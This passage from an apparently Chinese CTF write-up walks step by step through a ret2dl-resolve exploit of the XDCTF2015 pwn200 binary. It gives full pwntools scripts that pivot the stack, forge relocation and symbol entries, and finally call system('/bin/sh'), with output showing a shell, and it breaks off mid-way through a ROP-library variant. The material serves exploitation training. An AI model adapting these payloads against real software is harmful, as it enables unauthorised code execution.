class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JMPREL = <span class="number">0x08048318</span> 				<span class="comment">#.rel.plt表的基址</span></span><br><span class="line">plt_start = <span class="number">0x08048370</span></span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> 	<span class="comment">#计算得出</span></span><br><span class="line">rel_offset = fake_rel_addr - JMPREL	</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">base_stage+28指向fake rel，即所以fake rel的地址减去JMPREL基址即得到fake rel相对于.rel.plt表的偏移,</span></span><br><span class="line"><span class="string">即reloc_arg/reloc_offset/index_offset</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r_info = <span class="number">0x507</span></span><br><span class="line">fake_rel = p32(write_got) + p32(r_info)</span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_start)</span><br><span class="line">payload2 += p32(rel_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_rel</span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>成功</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0</span>x8 bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            │<span class="regexp">/bin│/</span>sh·│</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line"><span class="regexp">/bin/</span>sh\x00[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<h3 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h3><p>构造fake_sym，使其指向我们控制的st_name<br>结构体数组Elf32_Sym[r_info&gt;&gt;8]，所以基址SYMTAB加上 下标*0x10<br>由于本题write函数对应的<strong>r_info=0x507</strong>，0x507&gt;&gt;8=5，所以对应的sym结构体地址为SYMTAB+0x10*5<br>write函数的sym结构体中还有16字节内容需要伪造，其中<strong>st_name=0x54</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JMPREL = <span class="number">0x08048318</span> <span class="comment">#JMPREL Relocation Table重定位表的基址</span></span><br><span class="line">SYMTAB = <span class="number">0x080481d8</span> <span class="comment">#Symbol Table符号表的基址</span></span><br><span class="line">plt_start = <span class="number">0x08048370</span></span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> <span class="comment">#计算得出</span></span><br><span class="line">rel_offset = fake_rel_addr - JMPREL</span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line"></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">上面两行的操作是为了字节对齐。因为sym每个结构体大小均为0x10，我们希望把伪造的sym</span></span><br><span class="line"><span class="string">和真实的sym结构体对齐，具体来说就是让我们的fake_sym_addr最后一个数字</span></span><br><span class="line"><span class="string">与SYMTAB的最后一个数字相等（最后一个字节的低四位），本题而言就是希望fake_sym_addr的</span></span><br><span class="line"><span class="string">最后一个数字从0x4变为0x8。</span></span><br><span class="line"><span class="string">把fake_sym_addr-SYMTAB的结果与上0xf，即&amp;1111，从二进制层面来说就能得到前者的最后4bit，</span></span><br><span class="line"><span class="string">也就是提取出了偏移量的最后一个数字，进而计算得到其与0x10的差值。</span></span><br><span class="line"><span class="string">最后再在伪造的sym开始的地方填充对应差值大小的字符，从而字节对齐（如本题从0x804a844填充到0x804a848）</span></span><br><span class="line"><span class="string">这里如果恰巧没有填充时已经对齐了，仍然会被填充0x10字节的数据</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">index_dynsym = (fake_sym_addr - SYMTAB)/<span class="number">0x10</span> <span class="comment">#得到偏移除以0x10得到对应的结构体数组下标</span></span><br><span class="line"></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">反向计算，0x0507&gt;&gt;8=index_dynsym=0x5，而0x5&lt;&lt;8=0x500，</span></span><br><span class="line"><span class="string">由于之后会有一个验证r_info最后一个字节是否等于0x07的操作，</span></span><br><span class="line"><span class="string">所以这里的 |0x7 是为确保伪造的r_info通过验证（ELF_MACHINE_JMP_SLOT）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">否则产生如下报错</span></span><br><span class="line"><span class="string">Inconsistency detected by ld.so: dl-runtime.c: 79: _dl_fixup: </span></span><br><span class="line"><span class="string">Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27; failed!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_rel = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x54</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_start)</span><br><span class="line">payload2 += p32(rel_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_rel</span><br><span class="line">payload2 += <span class="string">&#x27;C&#x27;</span>*align <span class="comment">#填充偏移，字节对齐</span></span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>成功</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0</span>x8 bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            │<span class="regexp">/bin│/</span>sh·│</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line"><span class="regexp">/bin/</span>sh\x00[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h3><p>把<strong>st_name</strong>指向输入的字符串”write”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JMPREL = <span class="number">0x08048318</span> <span class="comment">#基址</span></span><br><span class="line">SYMTAB = <span class="number">0x080481d8</span>	<span class="comment">#基址</span></span><br><span class="line">plt_start = <span class="number">0x08048370</span></span><br><span class="line">STRTAB = <span class="number">0x08048268</span>	<span class="comment">#String Table的基址</span></span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> <span class="comment">#计算得到</span></span><br><span class="line">rel_offset = fake_rel_addr - JMPREL</span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - SYMTAB)/<span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_rel = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_name_addr = fake_sym_addr + <span class="number">16</span>	<span class="comment">#伪造的st_name的地址</span></span><br><span class="line">st_name = fake_name_addr - STRTAB	<span class="comment">#计算伪造地址与基址的偏移，从而保证正常解析</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_start)</span><br><span class="line">payload2 += p32(rel_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_rel</span><br><span class="line">payload2 += <span class="string">&#x27;C&#x27;</span>*align</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 += <span class="string">&#x27;write\x00&#x27;</span>	<span class="comment">#fake st_name</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h3><p>这一阶段，我们把字符串write替换为system，从而达到把system函数的地址写入write函数GOT表的效果。同时修改system的参数，从而执行system(‘/bin/sh’)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JMPREL = <span class="number">0x08048318</span> <span class="comment">#ji zhi</span></span><br><span class="line">SYMTAB = <span class="number">0x080481d8</span></span><br><span class="line">plt_start = <span class="number">0x08048370</span></span><br><span class="line">STRTAB = <span class="number">0x08048268</span></span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> <span class="comment">#计算得到</span></span><br><span class="line">rel_offset = fake_rel_addr - JMPREL</span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span>	<span class="comment">#计算得到</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span>	<span class="comment">#计算得到</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - SYMTAB)/<span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_rel = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_name_addr = fake_sym_addr + <span class="number">16</span>	<span class="comment">#计算得到</span></span><br><span class="line">st_name = fake_name_addr - STRTAB</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_start)</span><br><span class="line">payload2 += p32(rel_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(binsh_addr)<span class="comment">#system的参数</span></span><br><span class="line">payload2 += <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;BBBB&#x27;</span></span><br><span class="line">payload2 += fake_rel</span><br><span class="line">payload2 += <span class="string">&#x27;C&#x27;</span>*align</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 += <span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>成功getshell</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching <span class="keyword">to</span> interactive mode</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">[<span class="builtin-name">DEBUG</span>] Sent 0x7 bytes:</span><br><span class="line">    <span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[<span class="builtin-name">DEBUG</span>] Received 0x7 bytes:</span><br><span class="line">    <span class="string">&#x27;ayoung\n&#x27;</span></span><br><span class="line">ayoung</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="exp1-rop"><a href="#exp1-rop" class="headerlink" title="exp1-rop"></a>exp1-rop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn200&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn200&#x27;</span>)<span class="comment">#首先创建一个ROP对象</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#简易的调用read函数，相当于rop.call(&#x27;read&#x27;,[0,base_stage,100])</span></span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#rop.migrate(base_stage)会将程序流程又转到base_stage</span></span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">sh = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = base_stage + <span class="number">82</span></span><br><span class="line"></span><br><span class="line">fake_rel_addr = base_stage + <span 